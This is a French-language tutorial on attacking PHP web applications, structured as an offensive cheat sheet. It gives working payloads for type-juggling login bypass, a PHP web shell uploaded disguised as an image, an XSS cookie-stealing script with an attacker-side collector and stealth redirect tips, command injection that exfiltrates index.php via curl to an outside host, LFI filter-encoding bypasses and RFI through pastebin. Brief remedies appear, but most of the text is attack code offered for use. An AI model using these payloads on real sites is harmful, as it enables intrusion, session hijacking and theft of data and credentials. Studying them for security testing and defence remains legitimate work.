# Vulnérabilités PHP

Un autre article qui est lui aussi un peu vieillissant mais intéressant pour les bases [ici](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Webhacking:%20les%20failles%20php.pdf).

Les failles ci-dessous de PHP peuvent paraître facile à éviter puisqu'elles sont connues. Cependant elles existeront toujours pour les raisons suivantes:
* Erreur de programmation
* Niveau du développeur ou temps passé sur le code
* Trop peu de tests, peu de sensibilsation aux problématiques de sécurité
* Framework ajoutant des couches d'opacités 
* Les fonctions ci-dessous restent importantes et il est difficile de s'en passer en PHP. Il faut donc qu'elles soient utilisées en connaissance de cause

## Exploiter les variables globales
Les variables globales peuvent présenter une vulnérabilité. Par exemple une variable `$_SESSION[’logged’]` qui indiquerait si la session est admin ou pas, alors il est possible de récupérer une session admin en manipulant l'URL: 

    index.php ?_SESSION[logged]=1 
ou  

    index.php ?_SESSION%5Blogged%5D=1
Cette faille est toutefois assez ancienne et ne devrait plus être rencontrer. Pour s'en prémunir il faut mettre l'option `register_global` à `off` dans le `php.ini`, option qui est obsolète sur les versions plus récentes de PHP.

## Exploiter les Types
Il existe plusieurs façons de faire des comparaisons en PHP:
* La comparaison large `==` qui compare la valeur avec le transtypage et donne de nombreux faux positifs
* La comparaison stricte `===` qui compare le type et la valeur

Il est possible d'exploiter la comparaison large. Pour cela il faut analyser le [tableau des comparaisons PHP](https://www.php.net/manual/fr/types.comparisons.php), on y trouve que `"php" == 0` renvoie vrai.

Le contrôle d'authentification PHP suivant :

    <?php
        if($_POST['login'] == "admin" && $_POST['password'] == "p@ssword")){
			echo "authentification success";
		}	
    ?>

est vulnérable avec les données suivantes:

    login=0&password=0

En effet PHP va comparer `0` avec des chaînes de caractères et le if va donc revenir à `if (TRUE && TRUE)` authorisant l'accès. Pour se prémunir il faut donc utiliser la comparaison stricte `===`.

Dans la même idée, la fonction `strcmp` est vulnérable via les tableaux. Ainsi le code d'authentification:

    <?php
        if(!strcmp($_POST['login'], "admin") && !strcmp($_POST['password'], "p@ssword")){
			echo "authentification success";
		}
    ?>

est vulnérable avec les données :

    login=[]&password=[]

`strcmp` utilise bien la comparaison stricte mais est vulnérable au type juggling, si on lui passe un array, il plante et renvoi `NULL` or `NULL == 0`.
Pour l'url `[]` vaut `%5B%5D`.

Si l'authentification est gérée par un tableau de variable comme ceci:

    if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256))

Alors l'URL encodée correspond à ça 

    auth=%7B%22data%22%3A%7B%22login%22%3A0%2C%22password%22%3A%5B%5D%7D%7D
    // auth={"data":{"login":0,"password":[]}}

le [document de l'OWASP](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf) sur le sujet est très intéressant.

## Exploiter les fichiers de sauvegardes
Certaines mauvaises habitudes consistent à conserver une copie de sauvegarde d'un fichier PHP en guise d'archive. Le problème est que s'ils sont conservés dans le même espace, qui est donc accessible, l'ancien code devient accessible. On trouve par exemple ce type de format pour les sauvegardes:

    #.index.php
    _.index.php
    ~.index.php
    #index.php
    _index.php
    ~index.php
    index.php.bak
    index.php.old
    index.php2
    ...

## Uploading - Exploiter les images
Sur un upload d'image, il est possible d'insérer à la place d'une image un fichier PHP qui va nous permettre de récupérer un fichier:

    <?php $file = file_get_contents('../../../.passwd');var_dump($file); ?>
ou d'exécuter une commande:

    <?php system($_GET['cmd']); ?>
Puis dans l'url on fait un `?cmd=cat` ....

Piur bypasser le contrôle sur le contenu, il va falloir intercepter la requête sur le bouton `submit`, `upload` ou `envoyer`... et modifier le content dans la requête en ce qui est attendu, par exemple `image/gif`. Il suffira ensuite dans l'URL d'appele le fichier php uploader avec les bons arguments.

## Uploading - Exploiter les archives
En admettant que le but soit la récupération du fichier `index.php` et que le site va décompresser l'archive, il est possible de créer un lien symbolique vers `index.php` dans l'archive, lors de la décompression c'est le fichier cible du site qui apparaîtra. Pour créer l'archive à uploader:

    $ ln -s ../../../index.php file.txt
    $ zip --symplinks file.zip file.txt

## Exploiter la faille XSS avec PHP
La faille XSS consiste à injecter du code dans une entrée utilisateur pour exécuter du code JS ou HTML. Par exemple si on rentre `<b>Hello</b>` dans une entrée et que l'on voit le mot Hello affiché en gras, c'est que nous pouvons injecter du code. Pour s'en prémunir il faut filtrer les entrées utilisateurs avec la fonction `htmlspecialchars` qui remplace `<`, `>`, `&`, `'` et `"` par son équivalent HTML. Mais si ce n'est pas le cas ...

Il existe deux types de failles:
* la non permanente : rien ne sera enregistré dans la base de donnée
* la permanente : lorsque le code persistant. Il sera enregistré via un formulaire qui envoi un message à l'administrateur, un livre d'or (bien que l'on en trouve plus beaucoup)...

Avec la nom permanente on peut afficher le cookie comme suit :

    <script type="text/javascript">alert(document.cookie);</script>

La permanente est celle qui est dangeureuse. Une fois mise en place il faut inciter l'administrateur à aller dessus pour que le piège se referme et qu'elle s'exécute, on peur notamment ainsi récupérer son cookie et donc sa session avec les droits.

Par exemple, si une image n'exsite pas, le code suivant envoi le cookie admin à l'attaquant:

    <img src="notfound.png" onerror="window.location='http://www.attaquant.net/get.php?cookie='+document.cookie;">

get.php

    <?php 
        if(isset($_GET['c']) && is_string($_GET['c']) && !empty($_GET['c'])) {
    
            $referer = $_SERVER['HTTP_REFERER'];
            $date = date('d-m-Y \à H\hi');
            $data = "From :   $referer\r\nDate :   $date\r\nCookie : ".htmlentities($_GET['c'])."\r\n------------------------------\r\n";
    
            $handle = fopen('cookies.txt','a');
            fwrite($handle, $data);
            fclose($handle);
    
        }
    ?>
    <script language="javascript" type="text/javascript">
	    window.location.replace("http://www.diversion.com");
    </script>
Cette dernière partie sert à rediriger l'utilisateur ailleurs pour détourner son attention.

Pour tout faire d'un coup dans une URL sur laquelle l'admin n'aura qu'à se rendre :

    http://victime.com/vulnerable.php?variable=%3Cscript%3Ewindow.location.replace(%22http://attaquant.com/get.php?c=%22%2Bdocument.cookie.toString());%3C/script%3E
Pour être plus discret, utiliser tinyurl (bit.ly) ou encoder l'URL pour la rendre la moins lisible possible (ce qui n'est pas forcément moins suspect)

Une deuxième solution pour une rediretion discrète c'est d'utiliser un iframe sur la page `get.php`:

    <IFRAME SRC="http://diversion.com/redirect.html" width="0" height="0"></IFRAME>

Si le cookie est crypté, il reste utilisable. Si le cookie contient:

    sessid=xxxxxxxxxx;login=yyyyyyyyyy

Il suffit de taper dans la barre d'adresse du navigateur:

    javascript:alert(document.cookie="sessid=xxxxxxxxxx;login=yyyyyyyyyy")
Et de retourner sur la page cible.

## Exploiter la faille CSRF
La faille CSFR (Cross Site Request Forgery) consiste à faire exécuter une action par un autre utilisateur, typiquement un script admin disponible à une certaine URL que seul l'admin peut exécuter. Il faudra donc trouver le moyen de l'amener dessus. il faut donc connaitre l'URL provoquant l'action désirée et la faire exécuter par l'admin.  

## Exploiter la faille CRLF
La faille CRLT (Carry Return Line Feed) consiste à insérer un CRLF pour entrer une deuxième donnée. Typiquement la fonction `mail()` utilisé pour réinitilisé les mots de passe après oubli. Il suffirait de rentrer `victime@adresse.com%0Aattaquanf@adresse.com` pour être en copie du mot de passe temporaire.

## Les fonctions vulnérables

### Injection de commande:
Fonction | Description 
:- |:-
exec | Exécute un programme externe
passthru | Exécute un programme externe et affiche le résultat brut
system | Exécute un programme externe et affiche le résultat
shell_exec | Exécute une commande via le Shell et retourne le résultat sous forme de chaîne (équivalent : ``)
popen | Crée un processus de pointeur de fichier
proc_open | Exécute une commande et ouvre les pointeurs de fichiers pour les entrées / sorties
pcntl_exec | Exécute le programme indiqué dans l'espace courant de processus

Si une de ces fonctions est active il est possible de lui passer très facilement une commande, au hasard `cat /etc/passwd`. Il est néanmoins peu probable de trouver une exécution de commandes directe. Il est plus probable d'avoir une entrée utilisateur pour saisir un argument qui sera passé en commande.
Un exemple simple le code PHP exécute la commande `ping` et il est demandé à l'utulisateur de saisir l'adresse.
Il est alors facile d'exploiter la fonction avec le `;`. par exemple :

    google.fr;cat /etc/passwd

Un niveau de sécurité supplémentaire sur ce type de saisie consiste en un filtre évitant d'injecter dictement sa commande. Pour contourner cela il faut commencer par trouver quelles commandes fonctionne via un bruteforce et un [dictionnaire d'ensemble de commande](https://github.com/ismailtasdelen/command-injection-payload-list).

A partir de là avec BurpSuite:
1. Intercetpion de la trame avec la saisie de l'adresse (mettons `127.0.0.1`)
2. Via le module `intruder`de Burpsuite, nous positionnons un argument pour le bruteforce `ip=127.0.0.1§arg§`
3. Pour le payload, nous sélectionnons les commandes Unix et on observe parmi les résultats avec quoi il se passe quelquechose. Admettons que ce soit `%0A`
4. Nous allons par exemple utilisé ce byte pour enchainer une commande envoyant le fichier `index.php` sur request.bin sur lequel nous avons configurer un listener
5. Pour cela, via le module `repeater` de BurpSuite, modifier la requête comme suit:

    127.0.0.1%0Acurl -X POST -d @index.php https://enp9ldekp28gk.x.pipedream.net

### Injection de code
Fonction | Description 
:- |:-
eval| Exécute une chaîne comme un script PHP
assert| Vérifie si une assertion est fausse
preg_replace| Rechercher et remplacer par expression rationnelle standard. `('/.*/e',...)` Avec `/e` interprète la chaîne de remplacement en PHP
create_function| Crée une fonction anonyme. Obsolète depuis PHP 7.2
`$_GET['func_name']($_GET['argument']);`| Passer une fonction et argument via URL
ReflectionFunction | `$func = new ReflectionFunction($_GET['func_name']); $func->invoke(); or $func->invokeArgs(array());`

Il est possible de détecter la présence d'un `assert` sur la valeur d'une variable en la remplaçant par une quote `%27`, ce qui devrait amener une erreur explicite.
A partir de là, il devient possible d'injecter du code pour afficher les infos PHP ou afficher un fichier `.passwd` par exemple:

    ?var=%27.phpinfo().%27
    ?var=%27.highlight_file(%22.passwd%22).%27

Concernant la fonction `preg_replace`, l'utilsation de `/e` permet d'éxécuter une commande. L'OWASP nous indique [ici](https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet) qu'il est possible donc d'exploiter cette fonction pour exécuter une commande :

    preg_replace("/.*/e","system(’echo /etc/passwd’)") ;

avec 

    search => /.*/e 
    replace => echo /etc/passwd
    content => peu importe

Pour se prémunir il faut donc bloquer la fonction `system`. Cette protection peut être contournée en utilisant une fonction qui va faire la même chose, ici:

    search => /.*/e 
    replace => file_get_contents("index.php")
    content => peu importe  

### Injection de fichiers
Fonction | Description 
:- |:-
include| Inclut et exécute le fichier spécifié en argument
include_once| Inclut et évalue le fichier spécifié durant l'exécution du script. Le comportement est similaire à include, mais la différence est que si le code a déjà été inclus, il ne le sera pas une seconde fois, et include_once retourne TRUE
require| Identique à include mis à part le fait que lorsqu'une erreur survient, il produit également une erreur fatale de niveau E_COMPILE_ERROR
require_once| Identique à require mis à part que PHP vérifie si le fichier a déjà été inclus, et si c'est le cas, ne l'inclut pas une deuxième fois

L'injection de fichier consiste à passer à un variable (qui attend un fichier et qui sera en général traité par une des fonctions ci-dessus) un fichier qui correspond souvent à une section demandée. Il est possible d'injecter deux type de fichier:
* Un fichier local, on parle alors de LFI - Local File Inclusion
* Un fichier disant présent sur un serveur FTP ou HTTP, on parle alors de RFI - Remote File Inclusion

#### LFI
Le fichier inclu est interprété, on peut donc exécuté un script admin comme suit:

    ?inc=../admin
    ?inc=../admin&arg=value
Ou encore extraire un fichier de config encodé en base64 par exemple:

    ?inc=php://filter/read=convert.base64-encode/resource=config.php

Le serveur peut se prémunir de cette attaque en bloquant les caractère `.` et `/`. Il faut donc les remplacer par l'encodage:

    : => %3A
    . => %2E
    / => %2F
    = => %3D
    - => %2D
Puis en remplacant `%` par son encodage `%25` on a :

    : => %253A
    . => %252E
    / => %252F
    = => %253D
    - => %252D
Ce qui permet de transformer

    ?inc=php://filter/read=convert.base64-encode/resource=config.php
en

    page=php%253A%252F%252Ffilter%252Fconvert%252ebase64%252dencode%252Fresource%253Dconfig%252Ephp

Pour tout obtenir en une ligne

    curl http://domain.com/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252ebase64%252dencode%252Fresource%253Dconfig%252Ephp | base64 -d | grep password

#### RFI
Dans le cas du RFI nous allons pouvoir décider de ce que fait le fichier passé en paramètre et ne sommes donc pas bornés aux fonctionnalités trouvés sur le site cible.
Par exemple, considérons un script PHP affichant le fichier `index.php`:

    <?php echo file_get_contents("index.php"); ?>
A défaut de le stocké sur son propre serveur, il est possible d'utiliser un site comme https://pastebin.com pour stocker ce code (`raw.php`). Ne reste plus qu'à passer le fichier par exemple avec comme point d'entrée la configuration du fichier de langue et le # (`%23`) à la fin de l'url pour utiliser le payload:

    http://domain.cim/index.php?lang=http://pastebin.com/raw.php?i=Qbsbgvpk%23

#### Null byte
Le null byte `%00` sert à marquer la fin d'une chaîne de caractère. Il peut être utilsié dans le cas d'une injection de fichier quand par exemple l'extention est ajouté par le code. Pour charger le fichier `admin.php`, la valeur de la variable dans l'URL est `admin` et le script sur le serveur concatène le `.php`.
Dans ce cas le serveur contraint au chargement de fichier PHP. Pour le contourner et par exemple récupérer un `config.ini` il suffit de rentrer `config.ini%00` ainsi lors de l'interpretation le nom s'arrêtera au null byte et le `.php` concaténé ne sera pas lu.

### Les fonctions autorisant les callbacks
Fonction | Position dans les arguments 
:- |:-
ob_start| 0
array_diff_uassoc| -1
array_diff_ukey| -1
array_filter| 1
array_intersect_uassoc| -1
array_intersect_ukey| -1
array_map| 0
array_reduce| 1
array_udiff_assoc| -1
array_udiff_uassoc| array(-1, -2)
array_udiff| -1
array_uintersect_assoc| -1
array_uintersect_uassoc| array(-1, -2)
array_uintersect| -1
array_walk_recursive| 1
array_walk| 1
assert_options| 1
uasort| 1
uksort| 1
usort| 1
preg_replace_callback| 1
spl_autoload_register| 0
iterator_apply| 1
call_user_func| 0
call_user_func_array| 0
register_shutdown_function| 0
register_tick_function| 0
set_error_handler| 0
set_exception_handler| 0
session_set_save_handler| array(0, 1, 2, 3, 4, 5)
sqlite_create_aggregate| array(2, 3)
sqlite_create_function| 2

### Les fonctions qui donnent de l'info
Fonction | Description 
:- |:-
phpinfo| Affiche de nombreuses informations sur la configuration de PHP, stockée dans le fichier `php.ini` sur le serveur.
posix_mkfifo| Crée un fichier FIFO (first in, first out) (un pipe nommé)
posix_getlogin| Retourne le nom de login
posix_ttyname| Retourne le nom de device du terminal
getenv| Retourne la valeur d'une variable d'environnement
get_current_user| Retourne le nom du possesseur du script courant
proc_get_status| Lit les informations concernant un processus ouvert par proc_open()
get_cfg_var| Retourne la valeur d'une option de PHP
disk_free_space| Renvoie l'espace disque disponible sur le système de fichiers ou la partition
disk_total_space| Retourne la taille d'un dossier ou d'une partition
diskfreespace| Alias de disk_free_space()
getcwd| Retourne le dossier de travail courant
getlastmod| Retourne la date de dernière modification de la page
getmygid| Retourne le GID du propriétaire du script
getmyinode| Retourne l'inode du script
getmypid| Retourne le numéro de processus courant de PHP
getmyuid| Retourne l'UID du propriétaire du script actuel

### Les fonctions d'acès au système de fichier
#### Ouverture de fichier
Fonction | Description 
:- |:-
fopen| Ouvre un fichier ou une URL
tmpfile| Crée un fichier temporaire
bzopen| Ouvre un fichier compressé avec bzip2
gzopen| Ouvre un fichier compressé avec gzip
SplFileObject->__construct| La classe SplFileObject offre une interface orientée objet pour un fichier.

#### Ecriture sur le système de fichier
Fonction | Description 
:- |:-
chgrp| Change le groupe d'un fichier
chmod| Change le mode du fichier
chown| Change le propriétaire du fichier
copy| Copie un fichier
file_put_contents| Écrit des données dans un fichier
lchgrp| Change l'appartenance du groupe d'un lien symbolique
lchown| Change le propriétaire d'un lien symbolique
link| Crée un lien
mkdir| Crée un dossier
move_uploaded_file| Déplace un fichier téléchargé
rename| Renomme un fichier ou un dossier
rmdir| Efface un dossier
symlink| Crée un lien symbolique
tempnam| Crée un fichier avec un nom unique
touch| Modifie la date de modification et de dernier accès d'un fichier
unlink| Supprime un fichier
imagepng| Envoie une image PNG vers un navigateur ou un fichier
imagewbmp| Affichage de l'image vers le navigateur ou dans un fichier
imagewbmp| Affichage de l'image vers le navigateur ou dans un fichier
imagejpeg| Affichage de l'image vers le navigateur ou dans un fichier
imagexbm| Génère une image au format XBM
imagegif| Affichage de l'image vers le navigateur ou dans un fichier
imagegd| Génère une image au format GD, vers le navigateur ou un fichier
imagegd2| Génère une image au format GD2, vers le navigateur ou un fichier
iptcembed| Intègre des données binaires IPTC dans une image JPEG
ftp_get| Télécharge un fichier depuis un serveur FTP
ftp_nb_get| Lit un fichier sur un serveur FTP, et l'écrit dans un fichier (non bloquant)

#### Lecture depuis le système de fichier
Fonction | Description 
:- |:-
file_exists| Vérifie si un fichier ou un dossier existe
file_get_contents| Lit tout un fichier dans une chaîne
file| Lit le fichier et renvoie le résultat dans un tableau
fileatime| Renvoie la date à laquelle le fichier a été accédé pour la dernière fois
filectime| Renvoie la date de dernière modification de l'inode d'un fichier
filegroup| Lire le nom du groupe
fileinode| Lit le numéro d'inode du fichier
filemtime| Lit la date de dernière modification du fichier
fileowner| Lit l'identifiant du propriétaire d'un fichier
fileperms| Lit les droits d'un fichier
filesize| Lit la taille d'un fichier
filetype| Retourne le type de fichier
glob| Recherche des chemins qui vérifient un masque
is_dir| Indique si le fichier est un dossier
is_executable| Indique si le fichier est exécutable
is_file| Indique si le fichier est un véritable fichier
is_link| Indique si le fichier est un lien symbolique
is_readable| Indique si un fichier existe et est accessible en lecture
is_uploaded_file| Indique si le fichier a été téléchargé par HTTP POST
is_writable| Indique si un fichier est accessible en écriture
is_writeable| Alias de is_writable()
linkinfo| Renvoie les informations d'un lien
lstat| Retourne les informations sur un fichier ou un lien symbolique
parse_ini_file| Analyse un fichier de configuration
pathinfo| Retourne des informations sur un chemin système
readfile| Affiche un fichier
readlink| Renvoie le contenu d'un lien symbolique
realpath| Retourne le chemin canonique absolu
stat| Renvoie les informations à propos d'un fichier
gzfile| Lit la totalité d'un fichier compressé
readgzfile| Lit tout le fichier compressé
getimagesize| Retourne la taille d'une image
imagecreatefromgif| Crée une nouvelle image depuis un fichier ou une URL
imagecreatefromjpeg| Crée une nouvelle image depuis un fichier ou une URL
imagecreatefrompng| Crée une nouvelle image depuis un fichier ou une URL
imagecreatefromwbmp| Crée une nouvelle image depuis un fichier ou une URL
imagecreatefromxbm| Crée une nouvelle image depuis un fichier ou une URL
imagecreatefromxpm| Crée une nouvelle image depuis un fichier ou une URL
ftp_put| Charge un fichier sur un serveur FTP
ftp_nb_put| Envoie un fichier sur un serveur FTP (non-bloquant)
exif_read_data| Lit les en-têtes EXIF dans les images
read_exif_data| Alias de exif_read_data()
exif_thumbnail| Récupère la miniature d'une image
exif_imagetype| Détermine le type d'une image
hash_file| Génère une valeur de hachage en utilisant le contenu d'un fichier donné
hash_hmac_file| Génère une valeur de clé de hachage en utilisant la méthode HMAC et le contenu d'un fichier donné
hash_update_file| Ajoute des données dans un contexte de hachage actif provenant d'un fichier
md5_file| Calcule le md5 d'un fichier
sha1_file| Calcule le sha1 d'un fichier
highlight_file| Colorisation syntaxique d'un fichier
show_source| Alias de highlight_file()
php_strip_whitespace| Retourne la source sans commentaires, ni espaces blancs
get_meta_tags| Extrait toutes les balises méta d'un fichier HTML

Pas forcément utile mais si `allow_url_fopen=On`, une URL peut être donné à la place d'un path donc une fonction comme copy($_GET['s'], $_GET['d']); peut permettre d'insérer un script php dans le système de fichier

